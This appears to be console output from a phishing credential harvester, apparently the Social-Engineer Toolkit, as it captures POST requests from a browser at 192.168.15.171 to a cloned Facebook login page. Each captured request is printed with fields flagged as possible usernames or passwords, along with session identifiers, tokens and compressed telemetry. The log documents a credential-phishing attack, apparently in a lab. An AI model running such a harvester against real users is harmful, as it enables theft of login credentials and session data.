PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:32:17] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=8                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=j765cl:7dw0yc:qpu00h                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:32:17] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------6168710832972154761277578525                                                                  
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547562091                                                                
-----------------------------6168710832972154761277578525                    
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"j765cl:7dw0yc:qpu00h\",\"start_time\":1708547496,\"tos_array\":[123863035,0],\"tos_cum\":26,\"tos_id\":\"qpu00h\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":":7dw0yc:qpu00h","t":1708547501994.4,"b":[1,0]},1708547560088,0,415]],"user":"0","webSessionId":":7dw0yc:qpu00h","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""}]                                                            
-----------------------------6168710832972154761277578525--                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:32:42] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=9&__rev=1011554900&__s=%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=a                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=:7dw0yc:qpu00h                                                    
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:07] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=b                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=:7dw0yc:qpu00h                                                    
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:07] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=c                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=:7dw0yc:qpu00h                                                    
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:07] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------2502612580243068779380549672                                                                  
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547630526                                                                
-----------------------------2502612580243068779380549672                    
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_webweb_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":[1,null],\"event.info.upload_method.banzai.log_immediately\":[1,null],\"event.info.banzai.log_immediately.upload_processing\":[1,null],\"event.uploaded\":[1,null],\"event.captured\":[1,null]}}}}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":":7dw0yc:qpu00h","t":1708547506995.4,"b":[1,0]},1708547565088,0,556]],"user":"0","webSessionId":":7dw0yc:qpu00h","send_method":"beacon","compression":""}]                                                
-----------------------------2502612580243068779380549672--                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:50] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=d&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
192.168.15.171 - - [21/Feb/2024 17:33:53] "GET /index.html HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------1621364633612724986701067191                                                                  
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547633853                                                                
-----------------------------1621364633612724986701067191                    
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"mwnwVltbImZhbGNvOndlYl90aW1lX3NwZW50X2JpdF9hcnJheSIseyJlIjoie1wic2lkX3Jhd1wiOlwieWJlYW9mOjdkdzB5YzpxcHUwMGhcIixcInN0YXJ0XwFKSFwiOjE3MDg1NDc1OTYsXCJ0b3MJUzBcIjpbMTYzODMsNThdDRkcY3VtXCI6NDQNDwRpZAVmAHEZWAE+HGxlblwiOjM4DSXw7HNlcVwiOjJ9IiwiciI6MSwiZCI6IiRefEFjYjZDSXZDVTNtLUNuQXJjMllOUDVKY1Zza2xaWjNnYUwwMkZjTFpRSG42X2tPdTZkY1EzeHY1c3d6VENEemJ1LVlzeV9ocV9lbklHVi1MNjg4cER5cE5HUXxmZC5BY1oxUkRCMUJzNS1zN3c5cXJQSS0wWk9LUU9VU1EyTEgzck8xSXE3MEZ6MDRweHJlNC1VUjdJMkt6Q3hoelNsZUxrZnFGRzg2YjV5aU5PYnhBcGRFZUVIIiwicyI6InliZWFvZjo3ZHcweWM6cXB1MDBoIiwidDlNSDc1NzQ5LjQsImIiOlsxLDBdfSwtaDw2MzM4NDMsMCw0MThdLFsiOdoMYmx1ZS7fASxuYXZpZ2F0aW9uIiw14HRqc29uX2RhdGFcIjpcIntcXFwic291cmNlX3BhdGgBDwA6AQVIWFdlYkxvZ2luQ29udHJvbGxlcgEXACwBBQ0wEHRva2VuARAFMRw5NmU4OGFmMwERBSYMZGVzdBlUDG51bGwZFxk7FRgQY2F1c2UBPQVOFHVubG9hZAEPBTUAc02VBFxcCR9OQAEBHQUtPGNsaWNrX3BvaW50X2luZm8BGQA6BekQY2xhc3MFDwEFFF85bHNiIAEGADkBDwB9BT0N3BRlZl9wYWcJkBWjDRwIdXJpATAFRGRodHRwczovL3d3dy5mYWNlYm9vay5jb20vbCE8DC5waHABKwh9XCL+wAL+wAL+wALKwAIENTNmwAIgNiwwLDY0Ml1d","user":"0","webSessionId":"ybeaof:7dw0yc:qpu00h","send_method":"beacon","compression":"snappy_base64","snappy_ms":6}]                                                                          
-----------------------------1621364633612724986701067191--                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:53] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=e&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------101174279039973583402088820244                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547635441                                                                
-----------------------------101174279039973583402088820244                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"5QzIW1siZmFsY286cWUyX2pzX2V4cG9zdXJlIix7ImUiOiJ7XCJ1bml2ZXJzZVwiOlwiZmJ0ASdUcGVyZm9ybWFuY2VfdGVzdGluZ1wiLAUsDHRfaWQFKxkR9CABdHlwZVwiOjl9IiwiciI6MSwiZCI6IiRefEFjYjZDSXZDVTNtLUNuQXJjMllOUDVKY1Zza2xaWjNnYUwwMkZjTFpRSG42X2tPdTZkY1EzeHY1c3d6VENEemJ1LVlzeV9ocV9lbklHVi1MNjg4cER5cE5HUXxmZC5BY1oxUkRCMUJzNS1zN3c5cXJQSS0wWk9LUU9VU1EyTEgzck8xSXE3MEZ6MDRweHJlNC1VUjdJMkt6Q3hoelNsZUxrZnFGRzg2YjV5aU5PYnhBcGRFZUVIIiwicyI6InliZWFvZjo3ZHcweWM6eTdkcTVnIiwidCI6MTcwODU0NzQxMzkwMS40LCJiIjpbMSwwXX0sMTcwODU0NzYzNDQzMSwwLDM0MV0sWy2EdHdlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbj2TIGpzb25fZGF0YSVpPHtcXFwic291cmNlX3BhdGgBDwA6AQVIWFdlYkxvZ2luQ29udHJvbGxlcgEXACwBBQ0wEHRva2VuARAFMRw5NmU4OGFmMwERBSYMZGVzdKZUAAUuelIAJGltcHJlc3Npb25BKARcXAl5QDFpSldwREk2SXBXdmJUcVR5ARoFghBjYXVzZQEOBaEMbG9hZAENBRsYc2lkX3JhdwEQBR0IeWJlQpEBAR0ALAEFDfAUZWZfcGFnCVEMbnVsbC4cAAh1cmkBKgVMZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIVAMLnBocAErBT4F9lJYAAUa2lYADbAYcmVzdG9yZQX1HDp0cnVlfVwi/kcD/kcD/kcDwkcDDDQxMDBmRwMgNSwwLDc3N10skcthR4GhQF9kZXZpY2VfaW5mb19sb2cimdRQY3B1X2NvcmVzXCI6MSxcInJhbVwiTREwImdwdV9yZW5kZXJlckGgGCJsbHZtcGmBxAAsCR4QdmVuZG8JHCRNZXNhL1gub3Jn/pkB/pkB/pkB0pkBBDU3YpkBJDkzLDAsMzUzXV0=","user":"0","webSessionId":"ybeaof:7dw0yc:y7dq5g","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":4}]                                            
-----------------------------101174279039973583402088820244--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:33:55] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=1&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Ay7dq5g&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------1433477942108218258474110630                                                                  
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547643438                                                                
-----------------------------1433477942108218258474110630                    
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"mQyAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF5hiaXRzLmpzX2luaXRpYWxpemVkXCI6WzEsbnVsbF19fSxcIjcxNzMJODBlbnRpdGllcy5mZl9qBYoIcWUyAQpkZXhwb3N1cmUuMjU2MjgxMDQwNTU4LjAuQzMNOQB2AYMMbG9nZzJfAAgsXCIJGhRjYXB0dXJWHAAoaW5mby5iYW56YWkBQkQudXBsb2FkX3Byb2Nlc3NpbmcdsBVRCSUyUQAAfQEdQsEAJU4MbHVlXzkUKF9uYXZpZ2F0aW9u3tAABbQJhBhfbWV0aG9kHcIsX2ltbWVkaWF0ZWx5TrwABT0Z8S4vABFUwv0AAfwlhEpqAWYZASxwZXJmX2RldmljZV8BlgxfbG9n8hMBGdb+ygBWygD0HAF9fX0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjoieWJlYW9mOjdkdzB5Yzp5N2RxNWciLCJ0IjoxNzA4NTQ3NDE4OTAxLjQsImIiOlsxLDBdfSwxNzA4NTQ3NjM5MjM2LDAsMTA0NV0sWyKJQ0HxXewgYml0X2FycmF5nU4Uc2lkX3JhgSwIXCJ5SoIAJFwiLFwic3RhcnQFSgRcIhGOIDYzNCxcInRvcwlTQd0QMjU1LDBBfwEWGGN1bVwiOjgNJAxpZFwiAWIMN2RxNQlUASQYbGVuXCI6OQ0kGHNlcVwiOjD+1gH+1gH+1gG+1gEYMjIwOTkuNE7WATA0MjQzNSwwLDQxM11d","user":"0","webSessionId":"ybeaof:7dw0yc:y7dq5g","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                  
-----------------------------1433477942108218258474110630--                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:03] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=2&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Ay7dq5g&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------40446711001168161914109715227                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547652356                                                                
-----------------------------40446711001168161914109715227                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_webweb_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":[1,null],\"event.info.upload_method.banzai.log_immediately\":[1,null],\"event.info.banzai.log_immediately.upload_processing\":[1,null],\"event.uploaded\":[1,null],\"event.captured\":[1,null]}}}}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"ybeaof:7dw0yc:y7dq5g","t":1708547427100.4,"b":[1,0]},1708547647435,0,562]],"user":"0","webSessionId":"ybeaof:7dw0yc:y7dq5g","send_method":"beacon","compression":""}]                                    
-----------------------------40446711001168161914109715227--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:12] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=3&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Ay7dq5g&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
192.168.15.171 - - [21/Feb/2024 17:34:14] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------110599134137128146893643174812                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547655875                                                                
-----------------------------110599134137128146893643174812                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"5QvIW1siZmFsY286cWUyX2pzX2V4cG9zdXJlIix7ImUiOiJ7XCJ1bml2ZXJzZVwiOlwiZmJ0ASdUcGVyZm9ybWFuY2VfdGVzdGluZ1wiLAUsDHRfaWQFKxkR9CABdHlwZVwiOjl9IiwiciI6MSwiZCI6IiRefEFjYjZDSXZDVTNtLUNuQXJjMllOUDVKY1Zza2xaWjNnYUwwMkZjTFpRSG42X2tPdTZkY1EzeHY1c3d6VENEemJ1LVlzeV9ocV9lbklHVi1MNjg4cER5cE5HUXxmZC5BY1oxUkRCMUJzNS1zN3c5cXJQSS0wWk9LUU9VU1EyTEgzck8xSXE3MEZ6MDRweHJlNC1VUjdJMkt6Q3hoelNsZUxrZnFGRzg2YjV5aU5PYnhBcGRFZUVIIiwicyI6InliZWFvZjo4M2w5b3Y6NmhvdGRuIiwidCI6MTcwODU0NzQxMzg2My45LCJiIjpbMSwwXX0sMTcwODU0NzY1NDg2MCwwLDM0MV0sWy2EdHdlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbj2TIGpzb25fZGF0YSVpPHtcXFwic291cmNlX3BhdGgBDxQ6bnVsbCwBCg0ZEHRva2VuARAZGgxkZXN0GTEBHEhYV2ViTG9naW5Db250cm9sbGVyARcFSAUuGUYBGBw5NmU4OGFmMwEMBSQkaW1wcmVzc2lvbkEFCFxcIgUnQDFpSldwREk2SXBXdmJUcVR5ARoFMBBjYXVzZQEOBSgMbG9hZAENBRsYc2lkX3JhdwEQBR0IeWJlQm4BAR0ALAEFFHJlZmVycgmtBS4BFQUaAGQB5BRlZl9wYWcJaTUYBRoIdXJpASsFNGRodHRwczovL3d3dy5mYWNlYm9vay5jb20vbCESDC5waHABKwh9XCL+xwL+xwL+xwLCxwIMNDAyNmbHAiA5LDAsNjQ5XSyRS0HHgSFAX2RldmljZV9pbmZvX2xvZyKZVExjcHVfY29yZXNcIjoxLFwicmFtXFGaJCJncHVfcmVuZGUh0iQiOlwibGx2bXBpgUQALAkeFHZlbmRvcgUcJE1lc2EvWC5vcmf+mQH+mQH+mQHOmQEIMTUxXpkBKDk5NCwwLDM1M11d","user":"0","webSessionId":"ybeaof:83l9ov:6hotdn","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":4}]                                                        
-----------------------------110599134137128146893643174812--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:15] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=1&__rev=1011554900&__s=ybeaof%3A83l9ov%3A6hotdn&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------244846010122602119123506116610                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547663866                                                                
-----------------------------244846010122602119123506116610                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"mQyAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF5hiaXRzLmpzX2luaXRpYWxpemVkXCI6WzEsbnVsbF19fSxcIjcxNzMJODBlbnRpdGllcy5mZl9qBYoIcWUyAQpkZXhwb3N1cmUuMjU2MjgxMDQwNTU4LjAuQzMNOQB2AYMMbG9nZzJfAAgsXCIJGhRjYXB0dXJWHAAoaW5mby5iYW56YWkBQkQudXBsb2FkX3Byb2Nlc3NpbmcdsBVRCSUyUQAAfQEdQsEAJU4MbHVlXzkUKF9uYXZpZ2F0aW9u3tAABbQJhBhfbWV0aG9kHcIsX2ltbWVkaWF0ZWx5TrwABT0Z8S4vABFUwv0AAfwlhEpqAWYZASxwZXJmX2RldmljZV8BlgxfbG9n8hMBGdb+ygBWygD0HAF9fX0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjoieWJlYW9mOjgzbDlvdjo2aG90ZG4iLCJ0IjoxNzA4NTQ3NDE4ODY1LjksImIiOlsxLDBdfSwxNzA4NTQ3NjU5NzA4LDAsMTA0NV0sWyKJQ0HxXewgYml0X2FycmF5nU4Uc2lkX3JhgSwIXCJ5SoIAJFwiLFwic3RhcnQFSgRcIhGOIDY1NCxcInRvcwlTRd0MOTEsMEF/ARYYY3VtXCI6Nw0kLGlkXCI6XCI2aG90ZAlUASQYbGVuXCI6OQ0kGHNlcVwiOjD+1gH+1gH+1gG+1gEYMjIwMjAuOU7WATA2Mjg2NCwwLDQxM11d","user":"0","webSessionId":"ybeaof:83l9ov:6hotdn","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                  
-----------------------------244846010122602119123506116610--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
